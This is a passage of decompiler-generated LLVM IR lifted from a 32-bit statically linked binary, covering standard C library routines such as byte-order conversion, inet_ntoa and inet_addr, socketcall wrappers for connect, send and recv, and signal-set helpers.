  %v10_8060df8 = add i32 %v6_8060df8, %v8_8060df6
  store i32 %v9_8060df8, i32* %edi.global-to-local, align 4
  store i32 %v10_8060df8, i32* %esi.global-to-local, align 4
  %v1_8060df9 = inttoptr i32 %v10_8060df8 to i32*
  %v2_8060df9 = load i32, i32* %v1_8060df9, align 4
  %v4_8060df9 = inttoptr i32 %v9_8060df8 to i32*
  store i32 %v2_8060df9, i32* %v4_8060df9, align 4
  %v5_8060df9 = load i32, i32* %edi.global-to-local, align 4
  %v6_8060df9 = load i32, i32* %esi.global-to-local, align 4
  %v9_8060df9 = add i32 %v5_8060df9, %v8_8060df6
  %v10_8060df9 = add i32 %v6_8060df9, %v8_8060df6
  store i32 %v9_8060df9, i32* %edi.global-to-local, align 4
  store i32 %v10_8060df9, i32* %esi.global-to-local, align 4
  %v1_8060dfa = inttoptr i32 %v10_8060df9 to i16*
  %v2_8060dfa = load i16, i16* %v1_8060dfa, align 2
  %v4_8060dfa = inttoptr i32 %v9_8060df9 to i16*
  store i16 %v2_8060dfa, i16* %v4_8060dfa, align 2
  %v5_8060dfa = load i32, i32* %edi.global-to-local, align 4
  %v6_8060dfa = load i32, i32* %esi.global-to-local, align 4
  %v8_8060dfa = select i1 %v7_8060df6, i32 -2, i32 2
  %v9_8060dfa = add i32 %v5_8060dfa, %v8_8060dfa
  %v10_8060dfa = add i32 %v6_8060dfa, %v8_8060dfa
  store i32 %v9_8060dfa, i32* %edi.global-to-local, align 4
  store i32 %v10_8060dfa, i32* %esi.global-to-local, align 4
  %v1_8060dfc = inttoptr i32 %v10_8060dfa to i8*
  %v2_8060dfc = load i8, i8* %v1_8060dfc, align 1
  %v4_8060dfc = inttoptr i32 %v9_8060dfa to i8*
  store i8 %v2_8060dfc, i8* %v4_8060dfc, align 1
  %v5_8060dfc = load i32, i32* %edi.global-to-local, align 4
  %v6_8060dfc = load i32, i32* %esi.global-to-local, align 4
  %v7_8060dfc = load i1, i1* @df, align 1
  %v8_8060dfc = select i1 %v7_8060dfc, i32 -1, i32 1
  %v9_8060dfc = add i32 %v8_8060dfc, %v5_8060dfc
  %v10_8060dfc = add i32 %v8_8060dfc, %v6_8060dfc
  store i32 %v9_8060dfc, i32* %edi.global-to-local, align 4
  store i32 %v10_8060dfc, i32* %esi.global-to-local, align 4
  %v0_8060dfd = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8060dfd, i32* %eax.global-to-local, align 4
  %v2_8060dff = inttoptr i32 %v9_8060dfc to i32*
  store i32 %v0_8060dfd, i32* %v2_8060dff, align 4
  %v3_8060dff = load i32, i32* %edi.global-to-local, align 4
  %v5_8060dff = select i1 %v7_8060dfc, i32 -4, i32 4
  %v6_8060dff = add i32 %v3_8060dff, %v5_8060dff
  store i32 %v6_8060dff, i32* %edi.global-to-local, align 4
  %v0_8060e00 = load i32, i32* %eax.global-to-local, align 4
  %v2_8060e00 = inttoptr i32 %v6_8060dff to i32*
  store i32 %v0_8060e00, i32* %v2_8060e00, align 4
  %v3_8060e00 = load i32, i32* %edi.global-to-local, align 4
  %v6_8060e00 = add i32 %v3_8060e00, %v5_8060dff
  store i32 %v6_8060e00, i32* %edi.global-to-local, align 4
  %v0_8060e01 = load i32, i32* %eax.global-to-local, align 4
  %v2_8060e01 = inttoptr i32 %v6_8060e00 to i32*
  store i32 %v0_8060e01, i32* %v2_8060e01, align 4
  %v3_8060e01 = load i32, i32* %edi.global-to-local, align 4
  %v6_8060e01 = add i32 %v3_8060e01, %v5_8060dff
  store i32 %v6_8060e01, i32* %edi.global-to-local, align 4
  %v0_8060e02 = load i32, i32* %eax.global-to-local, align 4
  %v1_8060e02 = trunc i32 %v0_8060e02 to i8
  %v3_8060e02 = inttoptr i32 %v6_8060e01 to i8*
  store i8 %v1_8060e02, i8* %v3_8060e02, align 1
  %v4_8060e02 = load i32, i32* %edi.global-to-local, align 4
  %v5_8060e02 = load i1, i1* @df, align 1
  %v6_8060e02 = select i1 %v5_8060e02, i32 -1, i32 1
  %v7_8060e02 = add i32 %v6_8060e02, %v4_8060e02
  store i32 %v7_8060e02, i32* %edi.global-to-local, align 4
  %v0_8060e06.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8060e03

dec_label_pc_8060e03:                             ; preds = %entry, %dec_label_pc_8060dcd
  %v0_8060e06 = phi i32 [ %v1_8060dc9, %entry ], [ %v0_8060e06.pre, %dec_label_pc_8060dcd ]
  store i32 %v0_8060e06, i32* %eax.global-to-local, align 4
  %v2_8060e08 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8060e08, i32* @esi, align 4
  store i32 %v0_8060da8, i32* @edi, align 4
  ret i32 %v0_8060e06

; uselistorder directives
  uselistorder i32 %v0_8060e06, { 1, 0 }
  uselistorder i32 %v1_8060dc9, { 1, 0 }
  uselistorder i32 %v3_8060dbf, { 0, 2, 1 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8060e03, { 1, 0 }
}

define i32 @__GI_htons(i16 %arg1) local_unnamed_addr {
entry:
  %v3_8060e11 = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_8060e11 = zext i16 %v3_8060e11 to i32
  ret i32 %v4_8060e11
}

define i32 @__GI_htonl() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v1_8060e1d = call i32 @llvm.bswap.i32(i32 %tmp)
  ret i32 %v1_8060e1d
}

define i32 @__GI_ntohs(i16 %arg1) local_unnamed_addr {
entry:
  %v3_8060e25 = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_8060e25 = zext i16 %v3_8060e25 to i32
  ret i32 %v4_8060e25
}

define i32 @__GI_ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8060e31 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_8060e31
}

define i32 @hstrerror(i32 %arg1) local_unnamed_addr {
entry:
  %v6_8060e40 = icmp ugt i32 %arg1, 4
  br i1 %v6_8060e40, label %dec_label_pc_8060e49, label %dec_label_pc_8060e42

dec_label_pc_8060e42:                             ; preds = %entry
  %v1_8060e42 = mul i32 %arg1, 4
  %v2_8060e42 = add i32 %v1_8060e42, ptrtoint ([5 x i8*]* @global_var_806fb4c.1598 to i32)
  %v3_8060e42 = inttoptr i32 %v2_8060e42 to i32*
  %v4_8060e42 = load i32, i32* %v3_8060e42, align 4
  br label %dec_label_pc_8060e49

dec_label_pc_8060e49:                             ; preds = %entry, %dec_label_pc_8060e42
  %v0_8060e49 = phi i32 [ ptrtoint ([15 x i8]* @global_var_806fb60.1592 to i32), %entry ], [ %v4_8060e42, %dec_label_pc_8060e42 ]
  ret i32 %v0_8060e49

; uselistorder directives
  uselistorder label %dec_label_pc_8060e49, { 1, 0 }
}

define i32 @__GI_herror(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8060e4e = ptrtoint i8* %arg1 to i32
  %v2_8060e52 = icmp eq i8* %arg1, null
  br i1 %v2_8060e52, label %dec_label_pc_8060e60, label %dec_label_pc_8060e56

dec_label_pc_8060e56:                             ; preds = %entry
  %v3_8060e56 = load i8, i8* %arg1, align 1
  %v4_8060e56 = icmp eq i8 %v3_8060e56, 0
  %v1_8060e5e = icmp eq i1 %v4_8060e56, false
  br i1 %v1_8060e5e, label %dec_label_pc_8060e65, label %dec_label_pc_8060e60

dec_label_pc_8060e60:                             ; preds = %dec_label_pc_8060e56, %entry
  br label %dec_label_pc_8060e65

dec_label_pc_8060e65:                             ; preds = %dec_label_pc_8060e56, %dec_label_pc_8060e60
  %storemerge = phi i32 [ ptrtoint (i32* @global_var_806fb4b.1600 to i32), %dec_label_pc_8060e60 ], [ ptrtoint ([3 x i8]* @global_var_806fb49.1599 to i32), %dec_label_pc_8060e56 ]
  store i32 ptrtoint ([15 x i8]* @global_var_806fb60.1592 to i32), i32* @edx, align 4
  %v2_8060e6f = load i32, i32* inttoptr (i32 -4 to i32*), align 4
  %v6_8060e75 = icmp ugt i32 %v2_8060e6f, 4
  br i1 %v6_8060e75, label %dec_label_pc_8060e7e, label %dec_label_pc_8060e77

dec_label_pc_8060e77:                             ; preds = %dec_label_pc_8060e65
  %v1_8060e77 = mul i32 %v2_8060e6f, 4
  %v2_8060e77 = add i32 %v1_8060e77, ptrtoint ([5 x i8*]* @global_var_806fb4c.1598 to i32)
  %v3_8060e77 = inttoptr i32 %v2_8060e77 to i32*
  %v4_8060e77 = load i32, i32* %v3_8060e77, align 4
  store i32 %v4_8060e77, i32* @edx, align 4
  br label %dec_label_pc_8060e7e

dec_label_pc_8060e7e:                             ; preds = %dec_label_pc_8060e65, %dec_label_pc_8060e77
  %v0_8060e81 = phi i32 [ ptrtoint ([15 x i8]* @global_var_806fb60.1592 to i32), %dec_label_pc_8060e65 ], [ %v4_8060e77, %dec_label_pc_8060e77 ]
  %v0_8060e89 = load i32, i32* inttoptr (i32 134682900 to i32*), align 4
  %v9_8060e8f = call i32 @fprintf(i32 %v0_8060e89, i32 ptrtoint ([8 x i8]* @global_var_806fade.1601 to i32), i32 %v4_8060e4e, i32 %storemerge, i32 %v0_8060e81)
  ret i32 %v9_8060e8f

; uselistorder directives
  uselistorder i32 ptrtoint ([15 x i8]* @global_var_806fb60.1592 to i32), { 0, 2, 1 }
  uselistorder i8* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8060e7e, { 1, 0 }
  uselistorder label %dec_label_pc_8060e65, { 1, 0 }
}

define i32 @__GI_inet_ntoa_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8060e9c = load i32, i32* @edi, align 4
  store i32 0, i32* @edi, align 4
  %v0_8060e9f = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v0_8060ea2 = load i32, i32* @ebx, align 4
  store i32 %v0_8060ea2, i32* %stack_var_-12, align 4
  %v1_8060eab = call i32 @llvm.bswap.i32(i32 %arg1)
  %sext = mul i32 %v1_8060eab, 16777216
  %v1_8060ead = sdiv i32 %sext, 16777216
  store i32 %v1_8060ead, i32* @ebx, align 4
  %v1_8060eaf = add i32 %arg2, 15
  store i32 %v1_8060eaf, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8060eb4

dec_label_pc_8060eb4:                             ; preds = %entry, %dec_label_pc_8060ed9
  %v0_8060ebb17 = phi i32 [ %v1_8060ead, %entry ], [ %v2_8060ed9, %dec_label_pc_8060ed9 ]
  %v0_8060ee516 = phi i32 [ %v1_8060eaf, %entry ], [ %v0_8060edd, %dec_label_pc_8060ed9 ]
  %v1_8060ebf = urem i32 %v0_8060ebb17, 256
  %v5_8060ec7 = inttoptr i32 %v0_8060ee516 to i8*
  %v6_8060ec7 = call i32 @_uintmaxtostr(i8* %v5_8060ec7, i32 %v1_8060ebf, i32 0, i32 -10, i32 0)
  %v0_8060ecf = load i32, i32* @esi, align 4
  %v1_8060ecf = icmp eq i32 %v0_8060ecf, 0
  %v1_8060ed1 = add i32 %v6_8060ec7, -1
  store i32 %v1_8060ed1, i32* %ecx.global-to-local, align 4
  br i1 %v1_8060ecf, label %dec_label_pc_8060ed9, label %dec_label_pc_8060ed6

dec_label_pc_8060ed6:                             ; preds = %dec_label_pc_8060eb4
  %v1_8060ed6 = inttoptr i32 %v0_8060ecf to i8*
  store i8 46, i8* %v1_8060ed6, align 1
  %v0_8060edd.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8060ed9

dec_label_pc_8060ed9:                             ; preds = %dec_label_pc_8060eb4, %dec_label_pc_8060ed6
  %v0_8060edd = phi i32 [ %v1_8060ed1, %dec_label_pc_8060eb4 ], [ %v0_8060edd.pre, %dec_label_pc_8060ed6 ]
  %v0_8060ed9 = load i32, i32* @ebx, align 4
  %v2_8060ed9 = udiv i32 %v0_8060ed9, 256
  store i32 %v2_8060ed9, i32* @ebx, align 4
  %v0_8060edc = load i32, i32* @edi, align 4
  %v1_8060edc = add i32 %v0_8060edc, 1
  store i32 %v1_8060edc, i32* @edi, align 4
  store i32 %v0_8060edd, i32* @esi, align 4
  %v7_8060ee2 = icmp sgt i32 %v1_8060edc, 3
  br i1 %v7_8060ee2, label %dec_label_pc_8060ee4, label %dec_label_pc_8060eb4

dec_label_pc_8060ee4:                             ; preds = %dec_label_pc_8060ed9
  %v2_8060ee4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8060ee4, i32* @ebx, align 4
  %v1_8060ee5 = add i32 %v0_8060edd, 1
  store i32 %v0_8060e9f, i32* @esi, align 4
  store i32 %v0_8060e9c, i32* @edi, align 4
  ret i32 %v1_8060ee5

; uselistorder directives
  uselistorder i32 %v0_8060edd, { 0, 2, 1 }
  uselistorder i32 %v1_8060ead, { 1, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder i32 -10, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8060ed9, { 1, 0 }
  uselistorder label %dec_label_pc_8060eb4, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  %v2_8060ef7 = call i32 @__GI_inet_ntoa_r(i32 %arg1, i32 ptrtoint (i32* @global_var_8077b94.1602 to i32))
  ret i32 %v2_8060ef7
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_8060f03 = ptrtoint i32* %stack_var_-4 to i32
  %v2_8060f0c = inttoptr i32 %arg1 to i8*
  %v3_8060f0c = call i32 @inet_aton(i8* %v2_8060f0c, i32 %v2_8060f03)
  %v1_8060f17 = icmp eq i32 %v3_8060f0c, 0
  br i1 %v1_8060f17, label %dec_label_pc_8060f1f, label %dec_label_pc_8060f1b

dec_label_pc_8060f1b:                             ; preds = %entry
  %v3_8060f1b = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8060f1f

dec_label_pc_8060f1f:                             ; preds = %entry, %dec_label_pc_8060f1b
  %v0_8060f1f = phi i32 [ -1, %entry ], [ %v3_8060f1b, %dec_label_pc_8060f1b ]
  ret i32 %v0_8060f1f

; uselistorder directives
  uselistorder label %dec_label_pc_8060f1f, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %v2_8060f31 = call i32 @__GI_gethostbyname2(i32 %arg1, i32 2)
  ret i32 %v2_8060f31
}

define i32 @__GI_gethostbyname2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  call void @llvm.trap()
  unreachable
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v0_8060f78 = load i32, i32* @esi, align 4
  %v0_8060f79 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v0_8060f95 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8060f9b = icmp eq i32 %v0_8060f95, 0
  %v2_8060f9d = ptrtoint i32* %stack_var_-20 to i32
  %v1_8060fa1 = icmp eq i1 %v1_8060f9b, false
  br i1 %v1_8060fa1, label %dec_label_pc_8060fb1, label %dec_label_pc_8060fa3

dec_label_pc_8060fa3:                             ; preds = %entry
  %v2_8060fa8 = call i32 @__socketcall(i32 3, i32 %v2_8060f9d)
  br label %dec_label_pc_8060fcb

dec_label_pc_8060fb1:                             ; preds = %entry
  %v4_8060fb1 = call i32 @__libc_enable_asynccancel(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v0_8060f79)
  store i32 %v4_8060fb1, i32* @ebx, align 4
  %v2_8060fbd = call i32 @__socketcall(i32 3, i32 %v2_8060f9d)
  store i32 %v2_8060fbd, i32* @esi, align 4
  %v0_8060fc4 = load i32, i32* @ebx, align 4
  store i32 %v0_8060fc4, i32* @eax, align 4
  %v1_8060fc6 = call i32 @__libc_disable_asynccancel(i32 3)
  %v0_8060fce.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8060fcb

dec_label_pc_8060fcb:                             ; preds = %dec_label_pc_8060fa3, %dec_label_pc_8060fb1
  %v0_8060fce = phi i32 [ %v2_8060fa8, %dec_label_pc_8060fa3 ], [ %v0_8060fce.pre, %dec_label_pc_8060fb1 ]
  store i32 %v0_8060f79, i32* @ebx, align 4
  store i32 %v0_8060f78, i32* @esi, align 4
  ret i32 %v0_8060fce

; uselistorder directives
  uselistorder i32 %v2_8060f9d, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder label %dec_label_pc_8060fcb, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8060fef = ptrtoint i32* %stack_var_-12 to i32
  %v2_8060ff6 = call i32 @__socketcall(i32 6, i32 %v2_8060fef)
  ret i32 %v2_8060ff6

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_806102b = ptrtoint i32* %stack_var_-20 to i32
  %v2_8061032 = call i32 @__socketcall(i32 15, i32 %v2_806102b)
  ret i32 %v2_8061032

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v0_806103c = load i32, i32* @esi, align 4
  %v0_806103d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v0_8061061 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8061067 = icmp eq i32 %v0_8061061, 0
  %v2_8061069 = ptrtoint i32* %stack_var_-24 to i32
  %v1_806106d = icmp eq i1 %v1_8061067, false
  br i1 %v1_806106d, label %dec_label_pc_806107d, label %dec_label_pc_806106f

dec_label_pc_806106f:                             ; preds = %entry
  %v2_8061074 = call i32 @__socketcall(i32 10, i32 %v2_8061069)
  br label %dec_label_pc_8061097

dec_label_pc_806107d:                             ; preds = %entry
  %v4_806107d = call i32 @__libc_enable_asynccancel(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  store i32 %v4_806107d, i32* @ebx, align 4
  %v2_8061089 = call i32 @__socketcall(i32 10, i32 %v2_8061069)
  store i32 %v2_8061089, i32* @esi, align 4
  %v0_8061090 = load i32, i32* @ebx, align 4
  store i32 %v0_8061090, i32* @eax, align 4
  %v1_8061092 = call i32 @__libc_disable_asynccancel(i32 10)
  %v0_806109a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8061097

dec_label_pc_8061097:                             ; preds = %dec_label_pc_806106f, %dec_label_pc_806107d
  %v0_806109a = phi i32 [ %v2_8061074, %dec_label_pc_806106f ], [ %v0_806109a.pre, %dec_label_pc_806107d ]
  store i32 %v0_806103d, i32* @ebx, align 4
  store i32 %v0_806103c, i32* @esi, align 4
  ret i32 %v0_806109a

; uselistorder directives
  uselistorder i32 %v2_8061069, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder label %dec_label_pc_8061097, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v0_80610a0 = load i32, i32* @esi, align 4
  %v0_80610a1 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v0_80610c5 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_80610cb = icmp eq i32 %v0_80610c5, 0
  %v2_80610cd = ptrtoint i32* %stack_var_-24 to i32
  %v1_80610d1 = icmp eq i1 %v1_80610cb, false
  br i1 %v1_80610d1, label %dec_label_pc_80610e1, label %dec_label_pc_80610d3

dec_label_pc_80610d3:                             ; preds = %entry
  %v2_80610d8 = call i32 @__socketcall(i32 9, i32 %v2_80610cd)
  br label %dec_label_pc_80610fb

dec_label_pc_80610e1:                             ; preds = %entry
  %v4_80610e1 = call i32 @__libc_enable_asynccancel(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  store i32 %v4_80610e1, i32* @ebx, align 4
  %v2_80610ed = call i32 @__socketcall(i32 9, i32 %v2_80610cd)
  store i32 %v2_80610ed, i32* @esi, align 4
  %v0_80610f4 = load i32, i32* @ebx, align 4
  store i32 %v0_80610f4, i32* @eax, align 4
  %v1_80610f6 = call i32 @__libc_disable_asynccancel(i32 9)
  %v0_80610fe.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80610fb

dec_label_pc_80610fb:                             ; preds = %dec_label_pc_80610d3, %dec_label_pc_80610e1
  %v0_80610fe = phi i32 [ %v2_80610d8, %dec_label_pc_80610d3 ], [ %v0_80610fe.pre, %dec_label_pc_80610e1 ]
  store i32 %v0_80610a1, i32* @ebx, align 4
  store i32 %v0_80610a0, i32* @esi, align 4
  ret i32 %v0_80610fe

; uselistorder directives
  uselistorder i32 %v2_80610cd, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder label %dec_label_pc_80610fb, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_8061104 = load i32, i32* @esi, align 4
  %v0_8061105 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-32, align 4
  %v0_8061139 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_806113f = icmp eq i32 %v0_8061139, 0
  %v2_8061141 = ptrtoint i32* %stack_var_-32 to i32
  %v1_8061145 = icmp eq i1 %v1_806113f, false
  br i1 %v1_8061145, label %dec_label_pc_8061155, label %dec_label_pc_8061147

dec_label_pc_8061147:                             ; preds = %entry
  %v2_806114c = call i32 @__socketcall(i32 11, i32 %v2_8061141)
  br label %dec_label_pc_806116f

dec_label_pc_8061155:                             ; preds = %entry
  %v4_8061155 = call i32 @__libc_enable_asynccancel(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  store i32 %v4_8061155, i32* @ebx, align 4
  %v2_8061161 = call i32 @__socketcall(i32 11, i32 %v2_8061141)
  store i32 %v2_8061161, i32* @esi, align 4
  %v0_8061168 = load i32, i32* @ebx, align 4
  store i32 %v0_8061168, i32* @eax, align 4
  %v1_806116a = call i32 @__libc_disable_asynccancel(i32 11)
  %v0_8061172.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_806116f

dec_label_pc_806116f:                             ; preds = %dec_label_pc_8061147, %dec_label_pc_8061155
  %v0_8061172 = phi i32 [ %v2_806114c, %dec_label_pc_8061147 ], [ %v0_8061172.pre, %dec_label_pc_8061155 ]
  store i32 %v0_8061105, i32* @ebx, align 4
  store i32 %v0_8061104, i32* @esi, align 4
  ret i32 %v0_8061172

; uselistorder directives
  uselistorder i32 %v2_8061141, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_806116f, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_80611a3 = ptrtoint i32* %stack_var_-20 to i32
  %v2_80611aa = call i32 @__socketcall(i32 14, i32 %v2_80611a3)
  ret i32 %v2_80611aa

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @socket(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80611cf = ptrtoint i32* %stack_var_-12 to i32
  %v2_80611d6 = call i32 @__socketcall(i32 1, i32 %v2_80611cf)
  ret i32 %v2_80611d6

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 4, 8, 10, 9, 1, 0, 3, 2, 7, 11, 6, 5 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp1 = icmp slt i32 %arg1, 1
  br i1 %tmp1, label %dec_label_pc_80611f2, label %dec_label_pc_80611e8

dec_label_pc_80611e8:                             ; preds = %entry
  %v1_80611e8 = add i32 %arg1, -64
  %v3_80611e8 = sub i32 63, %arg1
  %v4_80611e8 = and i32 %v3_80611e8, %arg1
  %v5_80611e8 = icmp slt i32 %v4_80611e8, 0
  %v6_80611e8 = icmp eq i32 %v1_80611e8, 0
  %v7_80611e8 = icmp slt i32 %v1_80611e8, 0
  %v3_80611eb = icmp eq i1 %v7_80611e8, %v5_80611e8
  %v4_80611eb = icmp eq i1 %v6_80611e8, false
  %v5_80611eb = and i1 %v4_80611eb, %v3_80611eb
  br i1 %v5_80611eb, label %dec_label_pc_80611f2, label %dec_label_pc_80611ed

dec_label_pc_80611ed:                             ; preds = %dec_label_pc_80611e8
  %v4_80611ed = call i32 @__sigaddset(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_80611f2

dec_label_pc_80611f2:                             ; preds = %dec_label_pc_80611e8, %entry, %dec_label_pc_80611ed
  store i32 22, i32* inttoptr (i32 -8 to i32*), align 8
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_80611e8, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_80611f2, { 2, 0, 1 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %tmp1 = ptrtoint i32* %arg1 to i32
  store i32 0, i32* %arg1, align 4
  %v1_806120e = add i32 %tmp1, 4
  %v2_806120e = inttoptr i32 %v1_806120e to i32*
  store i32 0, i32* %v2_806120e, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8061218 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_8061224 = icmp eq i32 %arg2, -1
  br i1 %v10_8061224, label %dec_label_pc_8061232, label %dec_label_pc_8061229

dec_label_pc_8061229:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_8061232, label %dec_label_pc_806122d

dec_label_pc_806122d:                             ; preds = %dec_label_pc_8061229
  %v7_8061230 = icmp sgt i32 %arg1, 64
  br i1 %v7_8061230, label %dec_label_pc_8061232, label %dec_label_pc_8061243

dec_label_pc_8061232:                             ; preds = %dec_label_pc_806122d, %dec_label_pc_8061229, %entry
  store i32 22, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_80612a0

dec_label_pc_8061243:                             ; preds = %dec_label_pc_806122d
  store i32 %arg2, i32* %stack_var_-24, align 4
  store i32 0, i32* %stack_var_-12, align 4
  %v0_8061257 = load i32, i32* @ecx, align 4
  %v2_806125a = ptrtoint i32* %stack_var_-12 to i32
  %v4_806125f = call i32 @__sigaddset(i32 %v2_806125a, i32 %arg1, i32 %v0_8061257, i32 %v0_8061257)
  %v2_806126c = call i32 @__GI___sigismember(i32 ptrtoint (i32* @global_var_80788c8.1605 to i32), i32 %arg1)
  %v2_8061282 = ptrtoint i32* %stack_var_-44 to i32
  %v4_806128d = call i32 @__libc_sigaction(i32 %arg1, i32* nonnull %stack_var_-24, i32 %v2_8061282)
  %v2_8061298 = icmp slt i32 %v4_806128d, 0
  br i1 %v2_8061298, label %dec_label_pc_80612a0, label %dec_label_pc_806129c

dec_label_pc_806129c:                             ; preds = %dec_label_pc_8061243
  %v3_806129c = load i32, i32* %stack_var_-44, align 4
  br label %dec_label_pc_80612a0

dec_label_pc_80612a0:                             ; preds = %dec_label_pc_8061243, %dec_label_pc_8061232, %dec_label_pc_806129c
  %v0_80612a3 = phi i32 [ -1, %dec_label_pc_8061243 ], [ -1, %dec_label_pc_8061232 ], [ %v3_806129c, %dec_label_pc_806129c ]
  store i32 %v0_8061218, i32* @ebx, align 4
  ret i32 %v0_80612a3

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 3, 4, 1, 2, 0, 5 }
  uselistorder label %dec_label_pc_80612a0, { 2, 0, 1 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_80612b6 = add i32 %arg2, -1
  %v1_80612b9 = urem i32 %v1_80612b6, 32
  %v2_80612b9 = icmp eq i32 %v1_80612b9, 0
  %v2_80612bc = udiv i32 %v1_80612b6, 32
  br i1 %v2_80612b9, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_80612bf = shl i32 1, %v1_80612b9
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_80612c1 = phi i32 [ 1, %entry ], [ %v5_80612bf, %bb ]
  %v2_80612c1 = mul nuw nsw i32 %v2_80612bc, 4
  %v3_80612c1 = add i32 %v2_80612c1, %arg1
